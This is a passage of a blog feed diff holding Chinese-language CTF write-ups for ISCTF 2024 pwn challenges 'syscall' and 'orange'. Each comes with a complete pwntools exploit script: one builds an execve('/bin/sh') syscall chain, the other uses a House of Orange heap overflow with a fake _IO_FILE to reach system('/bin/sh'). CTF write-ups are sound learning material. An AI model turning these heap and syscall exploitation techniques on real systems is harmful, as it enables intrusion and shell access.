+&lt;h2 id=&#34;syscall&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#syscall&#34;&gt;#&lt;/a&gt; syscall&lt;/h2&gt;
+&lt;p&gt;程序代码很明显，自己设置寄存器。但是需要找一个位置去写入 binsh 字符串，找一个返回可写内存地址的系统调用即可  brk rax=12，在 init 里也有这个 malloc 提示，但是我构造 read 的读入的地方应该为远程的 bss 段，后来发现只加 0x200 放到 heap 也可以。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;&#39;&#39;&#39;
+huan_attack_pwn
+&#39;&#39;&#39;
+
+import sys
+from pwn import *
+# from LibcSearcher import *
+# from ctypes import *
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+# context(arch=&#39;i386&#39; , os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+binary = &#39;./vuln&#39;
+libc = &#39;./libc.so.6&#39;
+host, port = &amp;quot;27.25.151.12:37390&amp;quot;.split(&amp;quot;:&amp;quot;)
+
+print((&#39;\033[31;40mremote\033[0m: (y)\n&#39;
+    &#39;\033[32;40mprocess\033[0m: (n)&#39;))
+
+if sys.argv[1] == &#39;y&#39;:
+    r = remote(host, int(port))
+else:
+    r = process(binary)
+
+# r = gdb.debug(binary)
+# libc = cdll.LoadLibrary(libc)
+# libc = ELF(libc)
+# elf = ELF(binary)
+# srand = libc.srand(libc.time(0)) #设置种子
+
+default = 1
+se      = lambda data                     : r.send(data)
+sa      = lambda delim, data              : r.sendafter(delim, data)
+sl      = lambda data                     : r.sendline(data)
+sla     = lambda delim, data              : r.sendlineafter(delim, data)
+rc      = lambda numb=4096                : r.recv(numb)
+rl      = lambda time=default             : r.recvline(timeout=time)
+ru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)
+rpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)
+uu32    = lambda data                     : u32(data.ljust(4, b&#39;\0&#39;))
+uu64    = lambda data                     : u64(data.ljust(8, b&#39;\0&#39;))
+lic     = lambda data                     : uu64(ru(data)[-6:])
+padding = lambda length                   : b&#39;Yhuan&#39; * (length // 5) + b&#39;Y&#39; * (length % 5)
+lg      = lambda var_name                 : log.success(f&amp;quot;&amp;#123;var_name&amp;#125; ：0x&amp;#123;globals()[var_name]:x&amp;#125;&amp;quot;)
+prl     = lambda var_name                 : print(len(var_name))
+debug   = lambda command=&#39;&#39;               : gdb.attach(r,command)
+it      = lambda                          : r.interactive()
+
+
+def set_reg(rax,rdi,rsi,rdx):
+        sla(&#39;RAX : &#39;,str(rax))
+        sla(&#39;RDI : &#39;,str(rdi))
+        sla(&#39;RSI : &#39;,str(rsi))
+        sla(&#39;RDX : &#39;,str(rdx))
+
+set_reg(12,0,0,0)
+
+ru(&#39;0x&#39;)
+# debug()
+addr = int(rc(12),16) - 0x10000  # bss
+lg(&#39;addr&#39;)
+# pause()
+set_reg(0,0,hex(addr),0x8)
+# pause()
+se(&#39;/bin/sh\x00&#39;)
+# pause()
+set_reg(59,addr,0,0)
+
+it()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/15.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;orange&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#orange&#34;&gt;#&lt;/a&gt; orange&lt;/h2&gt;
+&lt;p&gt;先进行逆向一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/16.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;add 没有限制 malloc 的大小，14 次 add 机会&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/17.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;show printf 的 show&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/18.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;edit size 重新设置，所以可以进行堆溢出漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/19.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这题通过题目描述，是 orange 打法，通过覆盖 top_chunk 的 size，放入 unsortbin 中，在申请泄露出 libc 和 heapbase，在打 apple 链即可，需要注意的是要堆风水的布置，不要有回车字符出现’\n’ TUT&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;&#39;&#39;&#39;
+huan_attack_pwn
+&#39;&#39;&#39;
+
+import sys
+from pwn import *
+from pwncli import *
+# from LibcSearcher import *
+# from ctypes import *
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+# context(arch=&#39;i386&#39; , os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+binary = &#39;./pwn&#39;
+libc = &#39;./libc-2.27.so&#39;
+ld = &#39;./ld-2.27.so&#39;
+host, port = &amp;quot;27.25.151.12:23160&amp;quot;.split(&amp;quot;:&amp;quot;)
+
+print((&#39;\033[31;40mremote\033[0m: (y)\n&#39;
+    &#39;\033[32;40mprocess\033[0m: (n)&#39;))
+
+if sys.argv[1] == &#39;y&#39;:
+    r = remote(host, int(port))
+else:
+    r = process(binary)
+
+# r = gdb.debug(binary)
+# libc = cdll.LoadLibrary(libc)
+libc = ELF(libc)
+elf = ELF(binary)
+ld = ELF(ld)
+# srand = libc.srand(libc.time(0)) #设置种子
+
+default = 1
+se      = lambda data                     : r.send(data)
+sa      = lambda delim, data              : r.sendafter(delim, data)
+sl      = lambda data                     : r.sendline(data)
+sla     = lambda delim, data              : r.sendlineafter(delim, data)
+rc      = lambda numb=4096                : r.recv(numb)
+rl      = lambda time=default             : r.recvline(timeout=time)
+ru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)
+rpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)
+uu32    = lambda data                     : u32(data.ljust(4, b&#39;\0&#39;))
+uu64    = lambda data                     : u64(data.ljust(8, b&#39;\0&#39;))
+lic     = lambda data                     : uu64(ru(data)[-6:])
+padding = lambda length                   : b&#39;Yhuan&#39; * (length // 5) + b&#39;Y&#39; * (length % 5)
+lg      = lambda var_name                 : log.success(f&amp;quot;&amp;#123;var_name&amp;#125; ：0x&amp;#123;globals()[var_name]:x&amp;#125;&amp;quot;)
+prl     = lambda var_name                 : print(len(var_name))
+debug   = lambda command=&#39;&#39;               : gdb.attach(r,command)
+it      = lambda                          : r.interactive()
+
+
+def menu(inputs):
+        sla(&#39;Enter \n&#39;,str(inputs))
+
+def exit_():
+        menu(0)
+
+def add(size):
+        menu(1)
+        sla(&#39;size\n&#39;,str(size))
+
+def fake_free(idx):
+        menu(2)
+        sla(&#39;index\n&#39;,str(idx))
+
+def show(idx):
+        menu(3)
+        sla(&#39;index&#39;,str(idx))
+
+def edit(idx,size,ct):
+        menu(4)
+        sla(&#39;index\n&#39;,str(idx))
+        sla(&#39;input size\n&#39;,str(size))
+        sla(&#39;input\n&#39;,ct)
+
+
+payload=b&#39;a&#39;*(0x10) + p64(0) + p64(0xd91)
+add(0x10)# 0 
+
+edit(0,len(payload),payload)
+add(0xf00)# 1
+# debug()
+add(0x400)# 2
+show(2)
+ru(&#39;index 2: &#39;)
+libcbase = u64(rc(6).ljust(8,b&#39;\x00&#39;)) - 0x3ec1f0 - 0xb0
+lg(&#39;libcbase&#39;)
+libc.address = libcbase
+pad = b&#39;a&#39;*        0x10
+edit(2,len(pad),pad)
+show(2)
+ru(pad)
+heapbase = u64(rc(6).ljust(8,b&#39;\x00&#39;)) - 0x270
+lg(&#39;heapbase&#39;)
+target_addr = libc.symbols[&#39;_IO_list_all&#39;]
+sys_addr = libc.symbols[&#39;system&#39;]
+binsh = next(libc.search(b&#39;/bin/sh&#39;))
+_lock = libcbase + 0x3ec708
+fake_IO_FILE = libcbase
+_IO_wfile_jumps = libcbase + 0x3e7d60
+fake_wfile = heapbase + 0x0228a0 + 0x100
+lg(&#39;fake_wfile&#39;)
+# pause()
+# ogg = [0x4f2be,0x4f2c5,0x4f322,0x10a38c]
+ 
+fake_file = flat(&amp;#123;
+    0:&amp;#123;
+        0:0x320,
+        0x68:next(libc.search(b&#39;/bin/sh&#39;)),
+        0xa0:fake_wfile,
+        0xa8:libc.symbols[&#39;system&#39;],
+        0xd8:_IO_wfile_jumps
+    &amp;#125;,
+    0x100:&amp;#123;
+        0x18:0,
+        0x30:0,
+        0x70:0,
+        0x88:0,
+        0x130:fake_wfile + 0x200
+    &amp;#125;,
+    0x300:&amp;#123;
+        0x68:libc.address + 0x520C7
+    &amp;#125;
+&amp;#125;)
+add(0x980)
+pl = b&#39;a&#39;*0x980 + p64(0) + p64(0x761)
+edit(3,len(pl),pl)
+add(0x1000)
+pl = b&#39;a&#39;*0x980 + p64(0) + p64(0x971)
+edit(3,len(pl),pl)
+pl = b&#39;a&#39;*0x400+p64(0)+p64(0x961)+p64(libcbase+0x3ec1e0)+p64(target_addr-0x10)+p64(heapbase+0x680)+p64(target_addr-0x20)
+edit(2, len(pl), pl)
+
+add(0xa00)
+
+edit(3, 0x2000, b&#39;b&#39;*0x980 + fake_file)
+pause()
+
+sla(&#39;Enter \n&#39;,str(0))
+it()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/ISCTF-2024/20.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="wp" />
+        <updated>2024-11-18T10:15:03.000Z</updated>
+    </entry>
     <entry>
         <id>https://yhuanhuan01.github.io/2024/08/06/TFCCTF_PWN/</id>
         <title>TFCCTF_PWN</title>
